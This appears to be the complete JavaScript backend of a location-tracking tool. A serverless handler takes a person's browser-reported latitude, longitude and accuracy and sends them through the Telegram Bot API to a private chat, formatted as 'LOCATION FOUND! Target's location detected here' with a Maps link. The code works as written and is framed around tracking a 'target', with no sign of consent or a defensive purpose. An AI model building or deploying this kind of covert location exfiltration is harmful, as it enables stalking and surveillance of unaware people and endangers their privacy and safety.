export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ error: "Method not allowed" });
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return res.status(500).json({ error: "Server configuration is incomplete" });
  }

  const { latitude, longitude, accuracy } = req.body || {};
  const lat = Number(latitude);
  const lon = Number(longitude);
  const acc = Number(accuracy);

  if (!Number.isFinite(lat) || !Number.isFinite(lon) ||
      lat < -90 || lat > 90 || lon < -180 || lon > 180) {
    return res.status(400).json({ error: "Invalid location data" });
  }

  const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
  const message = [
    "LOCATION FOUND!",
    "",
    "Target's location detected here:",
    `📍 Latitude: ${lat}`,
    `📍 Longitude: ${lon}`,
    `🎯 Accuracy: ${Number.isFinite(acc) ? Math.round(acc) + " meters" : "Unknown"}`,
    "",
    `🗺️ Google Maps: ${mapsUrl}`,
    "",
    `🕒 Time: ${new Date().toISOString()}`
  ].join("\n");

  try {
    const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message, disable_web_page_preview: true })
    });

    const telegramResult = await telegramResponse.json();
    if (!telegramResponse.ok || !telegramResult.ok) {
      return res.status(502).json({ error: "Telegram could not deliver the alert" });
    }

    return res.status(200).json({ success: true });
  } catch {
    return res.status(500).json({ error: "Could not contact Telegram" });
  }
}